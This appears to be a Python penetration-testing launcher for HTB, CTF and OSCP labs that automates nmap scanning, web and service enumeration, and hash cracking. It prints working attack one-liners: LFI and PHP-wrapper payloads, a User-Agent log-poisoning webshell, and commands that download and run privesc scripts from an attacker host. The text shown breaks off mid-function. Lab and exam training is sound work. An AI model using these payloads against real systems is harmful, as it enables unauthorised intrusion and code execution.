#!/usr/bin/env python3
"""
interactive_nmap_launcher_v6.py

Authorized-use scan launcher for HTB / CTF / OSCP lab environments.

Changes from v5 → v6:
  ARCHITECTURE
  - Imports shared helpers from oscp_toolkit_lib.py
  - Writes triage_handoff.json for exploit_runner.py handoff
  - Exploit confirmation layer moved to exploit_runner.py
    (launcher retains quick non-destructive PoC checks only)

  RECON ADDITIONS (gap list items 1-2)
  - follow_up_vhost()     — ffuf Host-header vhost fuzzing (VHOST-ENUM)
  - follow_up_git()       — git-dumper + truffleHog .git exposure check
  - follow_up_exiftool()  — exiftool metadata extraction from discovered files
  - searchsploit_banners()— auto searchsploit all product/version banners from XML

  WEB ATTACK ADDITIONS (gap list items 5-6)
  - follow_up_http() extended with:
      * PHP wrapper LFI probes
      * Log poisoning hints
      * RFI probe
      * droopescan (Drupal) / joomscan (Joomla) dispatch on CMS detection
      * Command injection probe URLs printed
      * IDOR pattern hints printed

  POST-EXPLOIT HELPER (gap list item 3)
  - post_exploit_helper() — file transfer + shell upgrade one-liners, OS-aware
    Printed automatically after a reverse shell-eligible finding scores ≥ 8

  LINPEAS / WINPEAS AUTO-SERVE (gap list item 4)
  - serve_privesc_scripts() — spins a background HTTP server from /opt/privesc

  WINDOWS PRIVESC (gap list item 7)
  - Potato family, AlwaysInstallElevated, DPAPI hints in AD follow-up

  AD ADVANCED (gap list item 8)
  - PtH, ACL/ACE, Shadow creds, GPO abuse notes in AD scan post-process

  TOMCAT WAR (gap list item 9)
  - _confirm_tomcat_manager now prints full msfvenom WAR deploy one-liner

  HASH CRACKING (gap list item 10)
  - hash_crack_helper() — hashid → hashcat mode → rockyou

  CeWL (gap list item 10)
  - follow_up_cewl() — spider target for domain-specific wordlist

Run:
  sudo python3 interactive_nmap_launcher_v6.py
"""

from __future__ import annotations

import http.server
import ipaddress
import json
import os
import shutil
import signal
import subprocess
import sys
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import asdict
from datetime import datetime
from pathlib import Path
from typing import Dict, Iterable, List, Optional, Tuple
import xml.etree.ElementTree as ET

# ── shared library ────────────────────────────────────────────────────────────
_lib = Path(__file__).parent / "oscp_toolkit_lib.py"
if not _lib.exists():
    print("[!] oscp_toolkit_lib.py not found. Place it in the same directory.")
    sys.exit(1)
import importlib.util as _ilu
_spec = _ilu.spec_from_file_location("oscp_toolkit_lib", _lib)
_mod  = _ilu.module_from_spec(_spec)   # type: ignore
_spec.loader.exec_module(_mod)         # type: ignore
import oscp_toolkit_lib as _lib_mod

from oscp_toolkit_lib import (
    CRED_STORE, HANDOFF_FILENAME,
    HandoffFile, TriageResult,
    WORDLIST_PRIORITY, USER_WORDLIST_PRIORITY, LFI_WORDLIST_PRIORITY,
    VHOST_WORDLIST_PRIORITY, PASSWORD_WORDLIST_PRIORITY,
    append_log, best_wordlist, cred_store_as_dicts,
    detect_hash_type, guess_os_from_services,
    have_bin, make_workspace, now_stamp,
    print_cred_store, prompt_until_valid, run_streaming_command,
    sanitize_target, save_handoff, store_credential,
    triage_from_dict, workspace_root, yes_no,
)

try:
    import yaml
    _YAML_AVAILABLE = True
except ImportError:
    _YAML_AVAILABLE = False

# ─────────────────────────────────────────────
# Playbook loader
# ─────────────────────────────────────────────

PLAYBOOK_CANDIDATES = [
    Path.cwd() / "OSCP_playbook_enhanced_yaml.txt",
    Path.cwd() / "OSCP_playbook_enhanced_yaml.yaml",
    Path.cwd() / "oscp_playbook.yaml",
    Path("/opt/oscp-toolkit/OSCP_playbook_enhanced_yaml.txt"),
]

def load_playbook() -> Optional[Dict]:
    if not _YAML_AVAILABLE:
        return None
    for candidate in PLAYBOOK_CANDIDATES:
        if candidate.exists():
            try:
                with candidate.open("r", encoding="utf-8") as f:
                    data = yaml.safe_load(f)
                print(f"[+] Playbook loaded: {candidate.name}")
                return data
            except Exception as e:
                print(f"[!] Failed to parse playbook {candidate}: {e}")
    print("[!] No playbook found; triage scoring disabled.")
    return None

PLAYBOOK: Optional[Dict] = None

# ─────────────────────────────────────────────
# General helpers
# ─────────────────────────────────────────────

def require_root() -> None:
    if os.geteuid() != 0:
        print("[!] Run with sudo/root:")
        print("    sudo python3 interactive_nmap_launcher_v6.py")
        sys.exit(1)

def require_nmap() -> None:
    if not have_bin("nmap"):
        print("[!] nmap not found in PATH.")
        sys.exit(1)

def validate_ip(value: str) -> str:
    try:
        ipaddress.ip_address(value)
        return value
    except ValueError:
        raise ValueError("Expected single IP in format X.X.X.X")

def validate_network(value: str) -> str:
    try:
        net = ipaddress.ip_network(value, strict=False)
        return str(net)
    except ValueError:
        raise ValueError("Expected subnet in format X.X.X.0/24")

def print_tool_banner() -> None:
    tools = [
        ("xsltproc",        "XML→HTML report"),
        ("whatweb",         "Web fingerprint"),
        ("nikto",           "Web baseline"),
        ("ffuf",            "Content / vhost discovery"),
        ("gobuster",        "Content discovery (alt)"),
        ("smbclient",       "SMB shares"),
        ("enum4linux",      "SMB enum"),
        ("netexec",         "SMB/WinRM enum (nxc)"),
        ("crackmapexec",    "SMB/WinRM enum (legacy)"),
        ("snmpwalk",        "SNMP enum"),
        ("wpscan",          "WordPress enum"),
        ("redis-cli",       "Redis enum"),
        ("smtp-user-enum",  "SMTP user enum"),
        ("dnsrecon",        "DNS recon"),
        ("showmount",       "NFS exports"),
        ("sqlmap",          "SQL injection"),
        ("searchsploit",    "Exploit DB lookup"),
        ("git-dumper",      ".git exposure"),
        ("droopescan",      "Drupal enum"),
        ("joomscan",        "Joomla enum"),
        ("exiftool",        "File metadata"),
        ("cewl",            "Custom wordlist spider"),
        ("hashcat",         "Hash cracking"),
        ("hashid",          "Hash identification"),
        ("msfvenom",        "Payload generation"),
        ("evil-winrm",      "WinRM shell"),
        ("impacket-GetNPUsers", "ASREPRoast"),
        ("impacket-GetUserSPNs","Kerberoast"),
    ]
    print("\n[+] Tool availability:")
    for name, purpose in tools:
        status = "OK     " if have_bin(name) else "MISSING"
        print(f"    - {name:<24} : {status} ({purpose})")
    if not _YAML_AVAILABLE:
        print("\n[!] PyYAML not installed — triage scoring disabled.")

# ─────────────────────────────────────────────
# Command execution / resume
# ─────────────────────────────────────────────

def run_or_resume_oA(
    cmd: List[str],
    base_path: Path,
    label: str,
    cwd: Optional[Path] = None,
    combined_log: Optional[Path] = None,
) -> int:
    xml   = Path(str(base_path) + ".xml")
    nmap  = Path(str(base_path) + ".nmap")
    gnmap = Path(str(base_path) + ".gnmap")

    def non_empty(p: Path) -> bool:
        return p.exists() and p.is_file() and p.stat().st_size > 0

    def xml_ok(p: Path) -> bool:
        if not non_empty(p):
            return False
        try:
            ET.parse(str(p))
            return True
        except ET.ParseError:
            return False

    if non_empty(nmap) and non_empty(gnmap) and xml_ok(xml):
        print(f"[+] Resume: valid output found for {base_path.name}, skipping.")
        return 0
    if xml.exists() or nmap.exists() or gnmap.exists():
        print(f"[!] Partial/corrupt outputs for {base_path.name}; re-running.")
    return run_streaming_command(cmd, label=label, cwd=cwd, combined_log=combined_log)

# ─────────────────────────────────────────────
# XML parsing
# ─────────────────────────────────────────────

def parse_nmap_xml(xml_file: Path) -> Dict:
    result: Dict = {"hosts": []}
    if not xml_file.exists() or xml_file.stat().st_size == 0:
        return result
    try:
        tree = ET.parse(xml_file)
    except ET.ParseError:
        return result
    root = tree.getroot()

    for host in root.findall("host"):
        state_el = host.find("status")
        state    = state_el.get("state", "unknown") if state_el is not None else "unknown"

        address = "unknown"
        for addr in host.findall("address"):
            if addr.get("addrtype") == "ipv4":
                address = addr.get("addr", "unknown")
                break
        if address == "unknown":
            addrs = host.findall("address")
            if addrs:
                address = addrs[0].get("addr", "unknown")

        hostnames = [x.get("name") for x in host.findall("./hostnames/hostname") if x.get("name")]

        ports = []
        for port in host.findall("./ports/port"):
            st = port.find("state")
            if st is None or st.get("state") != "open":
                continue
            svc     = port.find("service")
            scripts = []
            for s in port.findall("script"):
                sid  = s.get("id", "")
                sout = s.get("output", "")
                scripts.append({"id": sid, "output": sout})
                if sid == "ftp-anon" and "Anonymous FTP login allowed" in sout:
                    store_credential("anonymous", "anonymous",
                                     f"FTP {address}:{port.get('portid','')}", "anonymous")
                if sid == "redis-info" and "# Server" in sout:
                    store_credential("", "(no auth)",
                                     f"Redis {address}:{port.get('portid','')}", "no-auth")

            http_title = ""
            for s in scripts:
                if s["id"] == "http-title":
                    http_title = s["output"]
                    break

            ports.append({
                "port":      port.get("portid", ""),
                "protocol":  port.get("protocol", ""),
                "service":   svc.get("name", "")      if svc is not None else "",
                "product":   svc.get("product", "")   if svc is not None else "",
                "version":   svc.get("version", "")   if svc is not None else "",
                "extrainfo": svc.get("extrainfo", "") if svc is not None else "",
                "http_title": http_title,
                "scripts":   scripts,
            })

        result["hosts"].append({
            "address":   address,
            "state":     state,
            "hostnames": hostnames,
            "open_ports": ports,
        })
    return result

# ─────────────────────────────────────────────
# HTML + merge
# ─────────────────────────────────────────────

def build_html(xml_file: Path, html_file: Path, log_file: Optional[Path] = None) -> None:
    if not have_bin("xsltproc") or not xml_file.exists():
        return
    run_streaming_command(
        ["xsltproc", "/usr/share/nmap/nmap.xsl", str(xml_file), "-o", str(html_file)],
        label=f"Generate HTML: {html_file.name}", combined_log=log_file)

def merge_nmap_xmls(xml_paths: Iterable[Path], output_xml: Path) -> bool:
    import copy
    xml_list = [p for p in xml_paths if p.exists() and p.stat().st_size > 0]
    if not xml_list:
        return False

    base_tree = None
    for p in xml_list:
        try:
            base_tree = ET.parse(p)
            break
        except ET.ParseError:
            continue
    if base_tree is None:
        return False
    base_root = base_tree.getroot()

    def host_key(h: ET.Element) -> str:
        for addr in h.findall("address"):
            if addr.get("addrtype") == "ipv4":
                return addr.get("addr", "unknown")
        return "unknown"

    host_index = {host_key(h): h for h in base_root.findall("host")}

    for p in xml_list[1:]:
        try:
            root = ET.parse(p).getroot()
        except ET.ParseError:
            continue
        for host in root.findall("host"):
            key = host_key(host)
            if key not in host_index:
                base_root.append(copy.deepcopy(host))
                host_index[key] = base_root.findall("host")[-1]
                continue
            target_host  = host_index[key]
            target_ports = target_host.find("ports")
            if target_ports is None:
                target_ports = ET.SubElement(target_host, "ports")
            existing = {(pt.get("protocol"), pt.get("portid"))
                        for pt in target_ports.findall("port")}
            src_ports = host.find("ports")
            if src_ports is None:
                continue
            for port in src_ports.findall("port"):
                k2 = (port.get("protocol"), port.get("portid"))
                if k2 not in existing:
                    target_ports.append(copy.deepcopy(port))
                    existing.add(k2)

    base_tree.write(output_xml, encoding="utf-8", xml_declaration=True)
    return True

# ─────────────────────────────────────────────
# Markdown / Obsidian
# ─────────────────────────────────────────────

def service_buckets(parsed: Dict) -> Dict[str, List[Tuple[str, str]]]:
    buckets: Dict[str, List[Tuple[str, str]]] = {}
    for host in parsed.get("hosts", []):
        ip = host["address"]
        for p in host["open_ports"]:
            svc = p["service"] or "unknown"
            buckets.setdefault(svc, []).append((ip, p["port"]))
    return buckets

def generate_mermaid(parsed: Dict) -> str:
    lines = ["flowchart TD", " A[Start] --> B[Nmap Scan]"]
    for idx, host in enumerate(parsed.get("hosts", [])):
        hn = f"H{idx}"
        lines.append(f' B --> {hn}["{host["address"]}"]')
        for j, p in enumerate(host["open_ports"]):
            pn    = f"P{idx}_{j}"
            label = f'{p["port"]}/{p["protocol"]} {p["service"]}'.replace('"', "'")
            lines.append(f' {hn} --> {pn}["{label}"]')
    return "```mermaid\n" + "\n".join(lines) + "\n```"

def generate_markdown_summary(
    title: str, target: str, scan_type: str, stamp: str,
    xml_files: List[Path], output_md: Path,
    notes: Optional[List[str]] = None,
) -> None:
    lines = [
        f"# {title}", "",
        f"- **Scan Type:** {scan_type}",
        f"- **Target:** `{target}`",
        f"- **Timestamp:** `{stamp}`", "",
    ]
    if notes:
        lines += ["## Notes", ""]
        for n in notes:
            lines.append(f"- {n}")
        lines.append("")
    lines += ["## Results", ""]
    merged_parsed: Dict = {"hosts": []}
    for xml in xml_files:
        parsed = parse_nmap_xml(xml)
        merged_parsed["hosts"].extend(parsed["hosts"])
        lines.append(f"### {xml.name}")
        lines.append("")
        if not parsed["hosts"]:
            lines += ["- No parseable hosts found.", ""]
            continue
        for host in parsed["hosts"]:
            lines.append(f"#### Host `{host['address']}`")
            if host["hostnames"]:
                lines.append(f"- Hostnames: {', '.join(host['hostnames'])}")
            if not host["open_ports"]:
                lines += ["- No open ports parsed.", ""]
                continue
            lines.append("- Open ports:")
            for p in host["open_ports"]:
                detail = " ".join(x for x in [p["service"], p["product"],
                                               p["version"], p["extrainfo"]] if x)
                lines.append(f"  - `{p['port']}/{p['protocol']}` {detail}".rstrip())
                for s in p["scripts"][:2]:
                    if s["id"] or s["output"]:
                        snippet = s["output"][:150].replace("\n", " ")
                        lines.append(f"    - script `{s['id']}`: {snippet}")
            lines.append("")
    lines += ["## Attack Path Summary", "", generate_mermaid(merged_parsed), ""]
    lines += ["## Service Overview", ""]
    for svc, items in sorted(service_buckets(merged_parsed).items()):
        item_text = ", ".join(f"{ip}:{port}" for ip, port in items[:10])
        lines.append(f"- **{svc}**: {item_text}")
    output_md.write_text("\n".join(lines), encoding="utf-8")

def generate_obsidian_host_notes(parsed: Dict, notes_dir: Path) -> None:
    notes_dir.mkdir(parents=True, exist_ok=True)
    for host in parsed.get("hosts", []):
        host_file = notes_dir / f"{sanitize_target(host['address'])}.md"
        lines = [f"# Host {host['address']}", "", "## Open Ports", ""]
        for p in host["open_ports"]:
            detail = " ".join(x for x in [p["service"], p["product"],
                                           p["version"], p["extrainfo"]] if x)
            lines.append(f"- `{p['port']}/{p['protocol']}` {detail}".rstrip())
        lines += ["", "## Attack Ideas", "",
                  "- Web: content discovery, vhost fuzz, LFI/PHP wrappers, SQLi, upload bypass",
                  "- SMB: null session, shares, signing, relay",
                  "- AD: ASREPRoast, Kerberoast, ACL abuse, PtH",
                  "- NFS: showmount, writable exports, SSH key plant",
                  "- SMTP: user enumeration VRFY/EXPN", ""]
        host_file.write_text("\n".join(lines), encoding="utf-8")

# ─────────────────────────────────────────────
# Playbook triage scoring
# ─────────────────────────────────────────────

FREQ_SCORE = {
    "very_high": 5, "high": 4, "medium_high": 3,
    "medium": 2,    "low_medium": 1, "low": 1,
}

def score_parsed_against_playbook(parsed: Dict, playbook: Optional[Dict]) -> List[Dict]:
    if not playbook:
        return []
    fingerprint_map   = playbook.get("service_fingerprint_map", [])
    foothold_patterns = {fp["id"]: fp for fp in playbook.get("foothold_patterns", [])}
    scoring           = playbook.get("simple_scoring_model", {})
    signal_bonus      = scoring.get("signal_bonus", {})
    results = []

    for host in parsed.get("hosts", []):
        ip = host["address"]
        for p in host["open_ports"]:
            svc        = (p["service"]    or "").lower()
            product    = (p["product"]    or "").lower()
            version    = (p["version"]    or "").lower()
            port       = p["port"]
            http_title = (p.get("http_title") or "").lower()

            for fm in fingerprint_map:
                match = fm.get("match", {})
                fm_svc = (match.get("service") or "").lower()
                if fm_svc and fm_svc not in svc:
                    continue
                prod_contains = match.get("product_contains", [])
                if prod_contains and not any(pc.lower() in product for pc in prod_contains):
                    continue
                port_in = match.get("port_in", [])
                if port_in and int(port) not in [int(x) for x in port_in]:
                    continue
                title_contains = match.get("title_contains", "")
                if title_contains and title_contains.lower() not in http_title:
                    continue

                base_priority = fm.get("priority", 1)
                for path_id in fm.get("likely_paths", []):
                    fp         = foothold_patterns.get(path_id, {})
                    freq       = fp.get("estimated_exam_frequency", "low")
                    base_score = FREQ_SCORE.get(freq, 1)
                    bonus      = 0
                    if version:
                        bonus += signal_bonus.get("version_exposed", 0)
                    if product:
                        bonus += signal_bonus.get("service_default_banner", 0)
                    score = base_priority + base_score + bonus
                    results.append({
                        "ip":           ip,
                        "port":         port,
                        "service":      p["service"],
                        "product":      p["product"],
                        "version":      p["version"],
                        "pattern_id":   path_id,
                        "pattern_name": fp.get("name", path_id),
                        "score":        score,
                        "likely_next":  fp.get("likely_next_steps", []),
                        "enum_cmds":    fp.get("enumeration_commands",
                                               fm.get("recommended_enumeration", [])),
                        "confirmed":    False,
                        "exploited":    False,
                    })

    seen: Dict = {}
    for r in results:
        key = (r["ip"], r["port"], r["pattern_id"])
        if key not in seen or r["score"] > seen[key]["score"]:
            seen[key] = r
    return sorted(seen.values(), key=lambda x: x["score"], reverse=True)

def print_triage_list(ranked: List[Dict], output_md: Optional[Path] = None) -> None:
    if not ranked:
        print("[+] No triage data.")
        return
    lines = ["\n" + "=" * 60,
             "  TRIAGE PRIORITY LIST",
             "=" * 60]
    top  = [r for r in ranked if r["score"] >= 6]
    rest = [r for r in ranked if r["score"] < 6]

    def fmt(r: Dict, rank: int) -> str:
        out  = f"\n#{rank}  [{r['score']:>2}]  {r['ip']}:{r['port']}  ({r['service']})\n"
        out += f"      Pattern : {r['pattern_id']} — {r['pattern_name']}\n"
        if r["product"] or r["version"]:
            out += f"      Banner  : {r['product']} {r['version']}\n".rstrip() + "\n"
        if r["enum_cmds"]:
            out += f"      Commands: {r['enum_cmds'][0]}\n"
        if r["likely_next"]:
            out += f"      Next    : {r['likely_next'][0]}\n"
        return out

    if top:
        lines.append("\n  HIGH CONFIDENCE (score >= 6):\n")
        for i, r in enumerate(top, 1):
            lines.append(fmt(r, i))
    if rest:
        lines.append("\n  LOWER PRIORITY (score < 6):\n")
        for i, r in enumerate(rest, len(top) + 1):
            lines.append(fmt(r, i))
    lines.append("=" * 60)
    output = "\n".join(lines)
    print(output)
    if output_md and output_md.exists():
        with output_md.open("a", encoding="utf-8") as f:
            f.write("\n\n## Triage Priority List\n\n```\n" + output + "\n```\n")

# ─────────────────────────────────────────────
# NSE helpers
# ─────────────────────────────────────────────

UDP_CRITICAL_PORTS = "53,69,111,123,137,138,161,162,500,1194,1900,2049,5353"
NSE_DEFAULT  = "default"
NSE_SMB      = ("smb-security-mode,smb2-security-mode,smb-os-discovery,"
                "smb-vuln-ms17-010,smb-enum-shares,smb-vuln-cve2009-3103")
NSE_HTTP     = "http-title,http-auth-finder,http-methods,http-server-header,http-shellshock"
NSE_SSH      = "ssh-auth-methods,ssh-hostkey"
NSE_VULNERS  = "vulners --script-args mincvss=6.0"
FOLLOW_UP_TIMEOUT = 300

def nse_for_ports(open_ports: List[Dict]) -> str:
    scripts = {NSE_DEFAULT}
    for p in open_ports:
        svc = (p["service"] or "").lower()
        if "http" in svc or p["port"] in {"80", "443", "8080", "8443"}:
            scripts.add(NSE_HTTP)
        if svc in {"microsoft-ds", "netbios-ssn"} or p["port"] == "445":
            scripts.add(NSE_SMB)
        if svc == "ssh" or p["port"] == "22":
            scripts.add(NSE_SSH)
        if Path("/usr/share/nmap/scripts/vulners.nse").exists():
            scripts.add(NSE_VULNERS)
    return ",".join(scripts)

# ─────────────────────────────────────────────
# NEW: Linpeas / Winpeas auto-serve
# ─────────────────────────────────────────────

_HTTP_SERVER_THREAD: Optional[threading.Thread] = None
_HTTP_SERVER_PORT   = 8888
_HTTP_SERVER_DIR    = Path("/opt/privesc")

def serve_privesc_scripts(workspace: Path, log: Optional[Path]) -> None:
    """Spin a background HTTP server to serve privesc scripts to target."""
    global _HTTP_SERVER_THREAD

    serve_dir = _HTTP_SERVER_DIR
    if not serve_dir.exists():
        serve_dir = workspace
        print(f"[!] /opt/privesc not found — serving from workspace: {serve_dir}")

    scripts = list(serve_dir.glob("*.sh")) + list(serve_dir.glob("*.exe"))
    if not scripts:
        print(f"[!] No scripts found in {serve_dir}.")
        print("    Download linpeas/winpeas to /opt/privesc/ first:")
        print("    curl -L https://github.com/carlospolop/PEASS-ng/releases/latest"
              "/download/linpeas.sh -o /opt/privesc/linpeas.sh")
        print("    curl -L https://github.com/carlospolop/PEASS-ng/releases/latest"
              "/download/winPEASx64.exe -o /opt/privesc/winPEASx64.exe")
    else:
        print(f"[+] Serving from {serve_dir}:")
        for s in scripts:
            print(f"    {s.name}")

    kali_ip = input("  Enter your Kali/attacker IP: ").strip()
    if not kali_ip:
        print("[!] No IP provided — cannot generate download commands.")
        return

    print(f"\n[+] Starting HTTP server on port {_HTTP_SERVER_PORT}...")

    class _SilentHandler(http.server.SimpleHTTPRequestHandler):
        def log_message(self, *args): pass  # silence
        def __init__(self, *a, **kw):
            super().__init__(*a, directory=str(serve_dir), **kw)

    import socketserver
    try:
        httpd = socketserver.TCPServer(("", _HTTP_SERVER_PORT), _SilentHandler)
    except OSError:
        print(f"[!] Port {_HTTP_SERVER_PORT} already in use. Using 9090.")
        _HTTP_SERVER_PORT_USE = 9090  # type: ignore
        httpd = socketserver.TCPServer(("", 9090), _SilentHandler)
        _HTTP_SERVER_PORT_USE = 9090
    else:
        _HTTP_SERVER_PORT_USE = _HTTP_SERVER_PORT

    def _serve():
        httpd.serve_forever()

    t = threading.Thread(target=_serve, daemon=True)
    t.start()
    print(f"[+] HTTP server running at http://{kali_ip}:{_HTTP_SERVER_PORT_USE}/")
    print("\n  ── Linux target download commands ──")
    print(f"    curl -o /tmp/linpeas.sh http://{kali_ip}:{_HTTP_SERVER_PORT_USE}/linpeas.sh && chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh")
    print("\n  ── Windows target download commands ──")
    print(f"    certutil -urlcache -f http://{kali_ip}:{_HTTP_SERVER_PORT_USE}/winPEASx64.exe wp.exe && .\\wp.exe")
    print(f"    iwr http://{kali_ip}:{_HTTP_SERVER_PORT_USE}/winPEASx64.exe -OutFile wp.exe; .\\wp.exe")
    print("\n[+] Server running in background. Press Enter to stop it later.")

# ─────────────────────────────────────────────
# NEW: Post-exploit one-liner helper
# ─────────────────────────────────────────────

def post_exploit_helper(host_ip: str, os_guess: str) -> None:
    print("\n" + "═" * 60)
    print("  POST-EXPLOIT ONE-LINERS")
    print("═" * 60)

    print("\n── Shell stabilisation ──")
    if os_guess != "windows":
        print("  python3 -c 'import pty; pty.spawn(\"/bin/bash\")'")
        print("  python  -c 'import pty; pty.spawn(\"/bin/bash\")'")
        print("  script /dev/null -c bash")
        print("  [Ctrl+Z]")
        print("  stty raw -echo; fg")
        print("  [Enter] [Enter]")
        print("  stty rows $(tput lines) cols $(tput cols)")
        print("  export TERM=xterm")
    else:
        print("  rlwrap nc -lvnp <PORT>  (use rlwrap for readline in shells)")
        print("  powershell -NoP -NonI -W Hidden -Exec Bypass")

    print("\n── File transfer ──")
    print(f"  [Kali]   python3 -m http.server 8080")
    if os_guess != "windows":
        print(f"  [Linux]  wget http://<KALI>:8080/tool -O /tmp/tool")
        print(f"  [Linux]  curl -o /tmp/tool http://<KALI>:8080/tool")
    else:
        print(f"  [Win]    certutil -urlcache -f http://<KALI>:8080/tool.exe tool.exe")
        print(f"  [Win]    iwr http://<KALI>:8080/tool.exe -OutFile tool.exe")
        print(f"  [Win SMB] impacket-smbserver share . -smb2support")
        print(f"           copy \\\\<KALI>\\share\\tool.exe .\\tool.exe")

    print("\n── Privesc hints ──")
    if os_guess != "windows":
        print("  sudo -l")
        print("  find / -perm -4000 -type f 2>/dev/null")
        print("  cat /etc/crontab && ls -la /etc/cron.*")
        print("  find / -writable -not -path '/proc/*' 2>/dev/null | head -20")
        print("  cat /etc/passwd | grep -v nologin")
    else:
        print("  whoami /priv  (look for SeImpersonatePrivilege)")
        print("  reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated")
        print("  reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated")
        print("  wmic service get name,pathname,startmode | findstr /i /v \"C:\\\\Windows\"")
        print("  reg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\winlogon\"")

    print("═" * 60)

# ─────────────────────────────────────────────
# NEW: Hash crack helper
# ─────────────────────────────────────────────

def hash_crack_helper(workspace: Path, log: Optional[Path]) -> None:
    print("\n[HASH] Interactive hash cracker")
    raw = input("  Paste hash or path to hash file: ").strip()
    if not raw:
        return
    if Path(raw).exists():
        hash_file = Path(raw)
        sample    = hash_file.read_text().split("\n")[0].strip()
    else:
        hash_file = workspace / "manual_hash.txt"
        hash_file.write_text(raw + "\n")
        sample = raw

    if have_bin("hashid"):
        run_streaming_command(["hashid", sample],
                              label="hashid detection",
                              combined_log=log, timeout_seconds=15)

    mode = detect_hash_type(sample)
    print(f"  Detected hashcat mode: {mode}")
    override = input(f"  Override mode? [blank = use {mode}]: ").strip()
    if override:
        mode = override

    wl = best_wordlist(PASSWORD_WORDLIST_PRIORITY)
    if not wl:
        print("  [!] No password wordlist found. Install: apt install wordlists")
        return
    if have_bin("hashcat"):
        out_file = workspace / f"hashcat_cracked_{mode}.txt"
        run_streaming_command(
            ["hashcat", "-m", mode, str(hash_file), wl,
             "-o", str(out_file), "--force", "--quiet"],
            label=f"hashcat -m {mode}", combined_log=log, timeout_seconds=600)
        if out_file.exists() and out_file.stat().st_size > 0:
            print(f"\n  Cracked: {out_file}")
            for line in out_file.read_text().splitlines()[:10]:
                parts = line.rsplit(":", 1)
                if len(parts) == 2:
                    store_credential("(from hash)", parts[1].strip(),
                                     str(hash_file), "password")
    elif have_bin("john"):
        run_streaming_command(
            ["john", str(hash_file), f"--wordlist={wl}"],
            label="john the ripper", combined_log=log, timeout_seconds=600)
        run_streaming_command(["john", str(hash_file), "--show"],
                              label="john --show", combined_log=log, timeout_seconds=30)
    else:
        print("  hashcat not installed. Manual:")
        print(f"    hashcat -m {mode} {hash_file} {wl}")

# ─────────────────────────────────────────────
# NEW: searchsploit all banners
# ─────────────────────────────────────────────

def searchsploit_banners(parsed: Dict, workspace: Path, log: Optional[Path]) -> None:
    if not have_bin("searchsploit"):
        print("[!] searchsploit not installed. Run: apt install exploitdb")
        return
    seen: set = set()
    for host in parsed.get("hosts", []):
        for p in host["open_ports"]:
            banner = f"{p.get('product', '')} {p.get('version', '')}".strip()
            if not banner or banner in seen:
                continue
            seen.add(banner)
            run_streaming_command(
                ["searchsploit", banner],
                label=f"searchsploit '{banner}'",
                combined_log=log, timeout_seconds=20)

# ─────────────────────────────────────────────
# Follow-up enumeration
# ─────────────────────────────────────────────

def follow_up_http(ip: str, port: str, svc: str, out_dir: Path, log_file: Optional[Path]) -> None:
    svc_l    = (svc or "").lower()
    is_https = ("https" in svc_l) or (port in {"443", "8443", "9443"})
    scheme   = "https" if is_https else "http"
    url      = f"{scheme}://{ip}" if port in {"80", "443"} else f"{scheme}://{ip}:{port}"

    if have_bin("whatweb"):
        run_streaming_command(["whatweb", "-a", "3", url],
                              label=f"WEB whatweb {ip}:{port}",
                              combined_log=log_file, timeout_seconds=FOLLOW_UP_TIMEOUT)
    if have_bin("nikto"):
        run_streaming_command(["nikto", "-h", url],
                              label=f"WEB nikto {ip}:{port}",
                              combined_log=log_file, timeout_seconds=FOLLOW_UP_TIMEOUT)

    wordlist = best_wordlist(WORDLIST_PRIORITY)
    if have_bin("ffuf") and wordlist:
        run_streaming_command(
            ["ffuf", "-u", f"{url}/FUZZ", "-w", wordlist,
             "-mc", "200,201,204,301,302,307,401,403,405",
             "-t", "50", "-c"],
            label=f"WEB ffuf dir {ip}:{port}", combined_log=log_file,
            timeout_seconds=FOLLOW_UP_TIMEOUT)
        # Extension sweep
        run_streaming_command(
            ["ffuf", "-u", f"{url}/FUZZ", "-w", wordlist,
             "-e", ".php,.asp,.aspx,.txt,.bak,.zip,.sql,.conf,.log",
             "-mc", "200,201,204,301,302,307,401,403",
             "-t", "50", "-c"],
            label=f"WEB ffuf ext {ip}:{port}", combined_log=log_file,
            timeout_seconds=FOLLOW_UP_TIMEOUT)
    elif have_bin("gobuster") and wordlist:
        run_streaming_command(
            ["gobuster", "dir", "-u", url, "-w", wordlist,
             "-x", "php,asp,aspx,txt,bak,zip,sql", "--no-error"],
            label=f"WEB gobuster {ip}:{port}", combined_log=log_file,
            timeout_seconds=FOLLOW_UP_TIMEOUT)

    # WordPress
    if have_bin("wpscan"):
        run_streaming_command(
            ["wpscan", "--url", url, "--enumerate", "vp,vt,u", "--no-banner"],
            label=f"WEB wpscan {ip}:{port}", combined_log=log_file,
            timeout_seconds=FOLLOW_UP_TIMEOUT)

    # Drupal
    if have_bin("droopescan"):
        run_streaming_command(
            ["droopescan", "scan", "drupal", "-u", url, "-t", "8"],
            label=f"WEB droopescan {ip}:{port}", combined_log=log_file,
            timeout_seconds=FOLLOW_UP_TIMEOUT)

    # Joomla
    if have_bin("joomscan"):
        run_streaming_command(
            ["joomscan", "--url", url],
            label=f"WEB joomscan {ip}:{port}", combined_log=log_file,
            timeout_seconds=FOLLOW_UP_TIMEOUT)

    # LFI wordlist fuzz
    lfi_wl = best_wordlist(LFI_WORDLIST_PRIORITY)
    if have_bin("ffuf") and lfi_wl:
        # Try common param names
        for param in ["page", "file", "path", "lang", "include"]:
            run_streaming_command(
                ["ffuf", "-u", f"{url}/index.php?{param}=FUZZ",
                 "-w", lfi_wl, "-mc", "200", "-fs", "0", "-c", "-t", "30"],
                label=f"WEB lfi-fuzz param={param} {ip}:{port}",
                combined_log=log_file, timeout_seconds=120)

    # PHP wrapper probes (printed, not auto-fired)
    print(f"\n  [TIP] PHP wrapper LFI probes for {url}:")
    print(f"    curl -s '{url}/index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd'")
    print(f"    curl -s '{url}/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+'")
    print(f"    curl -s '{url}/index.php?page=expect://id'")

    # Log poisoning chain (printed)
    print(f"\n  [TIP] Log poisoning chain:")
    print(f"    curl -s -A '<?php system($_GET[\"cmd\"]); ?>' {url}/")
    print(f"    curl '{url}/index.php?page=/var/log/apache2/access.log&cmd=id'")
    print(f"    curl '{url}/index.php?page=/var/log/auth.log&cmd=id'")

    # Command injection (printed)
    print(f"\n  [TIP] Command injection test params:")
